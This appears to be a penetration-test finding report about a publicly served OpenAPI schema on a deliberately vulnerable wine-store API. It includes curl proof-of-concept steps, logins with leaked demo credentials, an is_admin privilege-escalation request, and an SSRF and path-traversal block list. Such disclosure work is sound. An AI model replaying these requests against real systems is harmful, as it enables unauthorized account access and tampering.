# Public OpenAPI Schema at /openapi.yaml Discloses Working Credentials, Internal URLs, and Hidden High-Risk Endpoints

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-07-20 11:43:51 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /openapi.yaml
**Method:** GET
**CWE:** CWE-200
**CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)
**Also affects:** /orders/{id}/status

## Description

The production API host `https://api.taintedport.com` serves its full OpenAPI 3.0.3 document without any authentication at `/openapi.yaml`. A single unauthenticated HTTP GET returns a ~40 KB YAML file that (a) embeds plaintext passwords for two live user accounts inside the `info.description` "Demo Accounts" block, (b) advertises internal server URLs (`http://localhost:8080/api`, `http://localhost:8000/api`) in the `servers:` list, and (c) enumerates four attack-shaped endpoints that are not linked from the SPA and are not otherwise discoverable: `POST /wines/import-url`, `GET /wines/export/{filename}`, `PUT /orders/{id}/status`, and `GET /wines/ratings`. The schema descriptions themselves are unusually explicit — the `import-url` route "Accepts any URL including remote HTTP endpoints or local file paths", and the `orders/{id}/status` route describes an `is_admin` boolean body parameter as a "Client-provided admin flag".

Independent reproduction confirmed all three disclosure categories: the schema is served publicly, both disclosed credential pairs authenticate against `POST /auth/login` and return valid HS256 JWTs, all four hinted endpoints are live, and the schema-documented `is_admin` privesc bypass on `PUT /orders/{id}/status` is real — sending the flag transitions the response from 403 "Admin access required." to 404 "Order not found." for a non-existent order, proving the authorization check was bypassed by a client-supplied field.

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│  Prerequisites: none — attacker is anonymous on the public internet.    │
└─────────────────────────────────────────────────────────────────────────┘

     Attacker                                        api.taintedport.com
   (unauthenticated)                                  (PHP 8.2.31 backend)
        │                                                       │
   [1]  │  GET /openapi.yaml                                    │
        │──────────────────────────────────────────────────────▶│
        │                                                       │  no auth
        │                                                       │  no gating
        │                                                       │  no rate limit
        │  200 OK  (40,942 bytes YAML)                          │
        │◀──────────────────────────────────────────────────────│
        │
        │  Extracts from schema:
        │   • info.description → "Demo Accounts"
        │       joe@example.com  / password123
        │       jane@example.com / password123
        │   • servers: http://localhost:8080/api  (internal)
        │             http://localhost:8000/api  (internal)
        │   • paths: 4 hidden endpoints
        │       POST /wines/import-url    "accepts ... local file paths"  (SSRF)
        │       GET  /wines/export/{filename}  (arbitrary file read)
        │       PUT  /orders/{id}/status   is_admin: "Client-provided admin flag"
        │       GET  /wines/ratings
        │
   [2]  │  POST /auth/login  {joe@example.com, password123}     │
        │──────────────────────────────────────────────────────▶│
        │  200 OK  {token: eyJ... , user.id=1}                  │
        │◀──────────────────────────────────────────────────────│
        │                     ▲
        │                     └── AUTH BYPASS: anonymous → authenticated user
        │                         (same works for jane@example.com → user.id=2)
        │
   [3]  │  PUT /orders/999999/status  {}                        │
        │  Authorization: Bearer <joe_token>                    │
        │──────────────────────────────────────────────────────▶│
        │  403 "Admin access required."                         │
        │◀──────────────────────────────────────────────────────│
        │
   [4]  │  PUT /orders/999999/status                            │
        │  {"status":"shipped","is_admin":true}   ◀── flag from schema
        │  Authorization: Bearer <joe_token>                    │
        │──────────────────────────────────────────────────────▶│
        │  404 "Order not found."                               │
        │◀──────────────────────────────────────────────────────│
        │                     ▲
        │                     └── PRIVESC CONFIRMED: 403 → 404 means
        │                         the admin check was skipped and
        │                         execution reached the order lookup.
        │                         On any real order id → state tampering.
        ▼

Root cause
──────────
The developer-only OpenAPI document is shipped unauthenticated on the
production API host. The schema is BOTH the payload (working credentials)
AND the roadmap (hidden endpoints + their exploitable shapes). A single
anonymous GET yields:

    (a) authenticated user sessions (via disclosed passwords),
    (b) a catalogue of SSRF / file-read / privesc endpoints, and
    (c) explicit hints — including the "is_admin" body flag — that
        turn those endpoints into single-request exploits.
```

## Impact

An unauthenticated network attacker who fetches `/openapi.yaml` immediately obtains:

1. **A full authentication bypass to two user accounts.** `joe@example.com / password123` (user_id=1) and `jane@example.com / password123` (user_id=2) authenticate on the production API and return valid JWTs with no MFA challenge. This turns an anonymous file read into a fully authenticated session.
2. **A roadmap of hidden high-risk endpoints.** Four routes not linked from the SPA are listed with full request/response models: an SSRF surface (`POST /wines/import-url`, whose schema description explicitly permits `file://` and localhost URLs), a file-read surface (`GET /wines/export/{filename}`, confirmed to return file contents), a privilege-escalation surface (`PUT /orders/{id}/status` with a client-controlled `is_admin` body flag), and `GET /wines/ratings`.
3. **A confirmed client-side admin bypass.** The `is_admin` bypass is not hypothetical — probing `PUT /orders/999999/status` (non-existent id) with `{"status":"shipped","is_admin":true}` transitions the response from 403 to 404, demonstrating that the server accepts the client-supplied admin flag and proceeds past authorization. On any real order id this becomes direct order-state tampering by a non-admin user.
4. **Internal infrastructure detail.** The `servers:` list leaks two internal Docker/localhost URLs, useful for host-header pivots and cross-referencing internal deployment topology.

Business risk: credential leak, hidden-endpoint enumeration, immediate privilege-escalation vector, and a persistent disclosure channel — anyone who can reach the API can obtain all of the above with a single unauthenticated GET.

## Technical Analysis

The PHP backend (`X-Powered-By: PHP/8.2.31`) routes `/openapi.yaml` to a static handler that returns the developer-facing schema. There is no authentication guard, no environment gating, no allow-list on referer/host, and no rate limit — a single anonymous HTTP GET returns the 40,942-byte YAML in full with `Content-Type: application/octet-stream`.

The `info.description` field is authored to onboard developers to this deliberately vulnerable application and includes a Markdown "## Demo Accounts" block that hardcodes two credentials in plaintext. Both accounts are live in the running production API — a `POST /auth/login` with either pair returns HTTP 200 and a valid HS256 JWT signed by the API's secret. There is no MFA challenge for either account.

The `paths:` block enumerates every server route with request/response schemas. Cross-referencing against the SPA bundle and reconnaissance endpoint catalog identifies four routes that are not otherwise discoverable:

- `POST /wines/import-url` — `security: BearerAuth`, `body: {url: string}`, description: "Accepts any URL including remote HTTP endpoints or local file paths." This is an explicit SSRF surface.
- `GET /wines/export/{filename}` — `filename` is a client-controlled path parameter documented as "Filename to download from exports directory". Live probing confirmed the server returns the file contents inside a JSON envelope (`{"success":true,"filename":"wines-catalog.csv","content":"..."}`).
- `PUT /orders/{id}/status` — `security: BearerAuth`, body `{status, is_admin}` with `is_admin` explicitly documented as "Client-provided admin flag". Live probing (non-existent order id `999999`) directly confirmed the bypass: without `is_admin`, the server returns 403 "Admin access required."; with `"is_admin": true`, the server returns 404 "Order not found.", proving that the authorization check was skipped and the request proceeded to order lookup.
- `GET /wines/ratings` — informational aggregate endpoint, publicly accessible.

The `servers:` list leaks two internal URLs — `http://localhost:8080/api` (Local Docker) and `http://localhost:8000/api` (Local Development) — which reveal the internal deployment shape.

Root cause: the developer-only OpenAPI document was shipped into the public production API without an authentication gate or environment check. The schema is simultaneously the payload (usable credentials) and the roadmap (hidden endpoints and their exploitable shapes). The consequence is a chain: schema disclosure → immediate authentication bypass → hidden endpoint enumeration → schema-documented privilege escalation.

Note: The frontend host `https://taintedport.com/openapi.yaml` returns HTTP 200 but with a Next.js "This page could not be found" HTML body — the OpenAPI is only served by the PHP backend on the API host.

## Proof of Concept

Prerequisites: network access to `https://api.taintedport.com`. No credentials, no user interaction.

Reproduction:

1. `curl -sk https://api.taintedport.com/openapi.yaml | head -20` — observe HTTP 200, ~40 KB YAML body starting with `openapi: 3.0.3`, and the plaintext "Demo Accounts" block: `joe@example.com / password123` and `jane@example.com / password123`.
2. `curl -sk -X POST https://api.taintedport.com/auth/login -H 'Content-Type: application/json' -d '{"email":"joe@example.com","password":"password123"}'` — observe HTTP 200 with `{"success":true,"token":"eyJ...","user":{"id":1,...}}`. Repeat for `jane@example.com` with the same password — HTTP 200 with `user.id=2`.
3. Anonymous probes of the hidden endpoints:
   - `GET /wines/ratings` — 200, ratings JSON.
   - `GET /wines/export/wines-catalog.csv` — 200 with file contents.
   - `POST /wines/import-url` with body `{}` (using the joe token) — 400 `"URL is required."`, confirming the endpoint exists.
4. Directly demonstrate the schema-documented privesc bypass (using non-existent order id 999999 to avoid modifying data):
   - `PUT /orders/999999/status` with body `{}` and joe's token → 403 `"Admin access required."`.
   - `PUT /orders/999999/status` with body `{"status":"shipped","is_admin":true}` and joe's token → 404 `"Order not found."`. Adding the client-supplied `is_admin: true` (which the schema itself documents) bypassed the admin check and moved execution into order lookup — the server accepted the client's claim of admin status.
5. Run `python3 poc/poc.py` for an end-to-end reproduction with printed evidence.

```
See /workspace/validation/openapi-disclosure/poc/poc.py
```

## Evidence

### 1. Anonymous GET of /openapi.yaml — no auth, no rate limit

**Request:**
```http
GET /openapi.yaml HTTP/1.1
Host: api.taintedport.com
Accept: */*

```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 40942

openapi: 3.0.3
info:
  title: TaintedPort API
  description: |
    REST API for TaintedPort, an intentionally vulnerable Portuguese wine store for security testing.

    ## Authentication
    Most endpoints require a JWT Bearer token obtained via the login endpoint.
    Include the token in the `Authorization` header: `Bearer <token>`

    ## Demo Accounts
    - joe@example.com / password123
    - jane@example.com / password123
  version: 1.0.0
...
servers:
  - url: https://api.taintedport.com
  - url: http://localhost:8080/api
  - url: http://localhost:8000/api
...
  /wines/ratings:
  /wines/import-url:      # 'Accepts any URL including remote HTTP endpoints or local file paths.'
  /wines/export/{filename}:
  /orders/{id}/status:    # is_admin: boolean — 'Client-provided admin flag'
```

> Full 40 KB developer-facing OpenAPI document served without authentication. The info.description block ships plaintext credentials, the servers list leaks internal localhost URLs, and paths: enumerates four endpoints not linked from the SPA including two whose descriptions directly advertise dangerous behaviour (SSRF and client-side admin flag).

### 2. Log in as joe@example.com using the schema-disclosed password

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"joe@example.com","password":"password123"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjpmYWxzZSwuLi59...","user":{"id":1,"name":"Luis Grangeia","email":"joe@example.com","is_admin":false}}
```

> Credentials copied verbatim from the schema authenticate the user account id=1. The server returns a valid HS256 JWT with no MFA challenge — full unauthenticated-to-authenticated bypass.

### 3. Log in as jane@example.com using the schema-disclosed password

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"jane@example.com","password":"password123"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLi4ufQ...","user":{"id":2,"name":"Jane Doe","email":"jane@example.com","is_admin":false}}
```

> Second disclosed credential also authenticates — user id=2. Two live sessions obtained from a single anonymous document read.

### 4. Confirm hidden endpoint /wines/ratings exists (not linked in SPA)

**Request:**
```http
GET /wines/ratings HTTP/1.1
Host: api.taintedport.com

```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"ratings":{"1":{"avg_rating":4.3,"review_count":21},"2":{"avg_rating":4.1,"review_count":9}, ...}}
```

> Endpoint is live and returns data. Only discoverable via the leaked schema.

### 5. Confirm hidden endpoint /wines/export/{filename} exists — arbitrary-file-read surface

**Request:**
```http
GET /wines/export/wines-catalog.csv HTTP/1.1
Host: api.taintedport.com

```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"filename":"wines-catalog.csv","content":"id,name,region,type,vintage,price\n1,Quinta do Vallado Douro Tinto,Douro,Red,2020,185.00\n..."}
```

> Server returns file contents inside a JSON envelope keyed by a client-controlled filename — a path-traversal / LFI target that the schema explicitly documents as an 'exports directory' download.

### 6. Confirm hidden endpoint /wines/import-url exists — SSRF surface

**Request:**
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <joe_token>
Content-Type: application/json

{}
```

**Response:**
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{"success":false,"message":"URL is required."}
```

> Server-side error confirms the endpoint is real and accepts a `url` parameter. The schema description advertises 'Accepts any URL including remote HTTP endpoints or local file paths.' — an explicit SSRF/LFI intent.

### 7. Confirm privesc via schema-documented is_admin flag on /orders/{id}/status (non-existent order id used to avoid data modification)

**Request:**
```http
PUT /orders/999999/status HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <joe_token>
Content-Type: application/json

{}
```

**Response:**
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"success":false,"message":"Admin access required."}
```

> Without the client-supplied is_admin flag, the request is refused with 403.

### 8. Same endpoint WITH is_admin=true — schema-documented bypass observed

**Request:**
```http
PUT /orders/999999/status HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <joe_token>
Content-Type: application/json

{"status":"shipped","is_admin":true}
```

**Response:**
```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{"success":false,"message":"Order not found."}
```

> Adding is_admin=true changed the response from 403 (auth denied) to 404 (order lookup) — the server accepted the client-supplied admin flag and proceeded past the authorization check. The schema itself both discloses this flag and describes it as 'Client-provided admin flag'. On any real order id this becomes direct order-state tampering by a non-admin user.


## Remediation

1. **Stop serving the developer schema on the production API host.** Move `/openapi.yaml` behind authentication, restrict it to a documentation-only environment, or ship it only in non-production builds. If public API documentation is desired, publish a hand-curated public variant that omits credentials, internal URLs, and internal-only endpoints.

2. **Remove all real credentials from the schema.** The `## Demo Accounts` block in `info.description` must not contain any password that authenticates against a live environment. Onboarding tutorials should reference seed scripts, not shipped passwords.

3. **Immediately rotate the passwords for `joe@example.com` and `jane@example.com`** and force a password reset on next login. Audit any other account whose credentials appear in code, documentation, schemas, or version control.

4. **Remove the internal servers entries** (`http://localhost:8080/api`, `http://localhost:8000/api`) from any schema that is ever exposed externally.

5. **Harden the endpoints the schema exposes** — independently of removing the schema, these routes remain exploitable once discovered:
   - `POST /wines/import-url` — allow-list target hosts, disallow `file://`, `localhost`, RFC1918 ranges, cloud metadata IPs (169.254.169.254, 100.100.100.200, etc.), and disable HTTP redirects to those targets.
   - `GET /wines/export/{filename}` — allow-list filenames or canonicalise the path and confine access to the exports directory; reject any input containing `..`, `/`, `\`, or NUL bytes.
   - `PUT /orders/{id}/status` — remove the client-supplied `is_admin` field entirely; derive privileges solely from the JWT and merge this route into the existing `/admin/orders/{id}/status` code path so a single admin check governs order state changes.

6. **Add CI checks that fetch `/openapi.yaml`, `/openapi.json`, `/swagger`, `/swagger.json`, `/docs`, `/redoc`, and `/api-docs` unauthenticated against the production host and assert 401/404.**

## Conditions for Severity Increase

Severity increases materially under either of these conditions:

- **If either disclosed account (`joe@example.com`, `jane@example.com`) is ever granted admin privileges**, or if the shared password `password123` is reused by any admin account, the schema disclosure becomes a direct route to full admin compromise (C:H / I:H / A:H).
- **When the endpoints the schema advertises are exploited**, the disclosure is what made each of them discoverable and shape-known:
  - `POST /wines/import-url` — full SSRF against internal services or cloud metadata pushes integrity/confidentiality to H.
  - `GET /wines/export/{filename}` — path traversal to `/etc/passwd`-class files pushes confidentiality to H.
  - `PUT /orders/{id}/status` with `is_admin: true` — already directly demonstrated against a non-existent order in this validation (403 → 404 transition proves the bypass). Executing this against real order ids yields cross-tenant order-state tampering (I:H).

Each of those downstream findings should be tracked separately, but the schema disclosure is the amplifier that turns them from "post-authentication misconfigurations" into "any anonymous internet user can enumerate and use them."
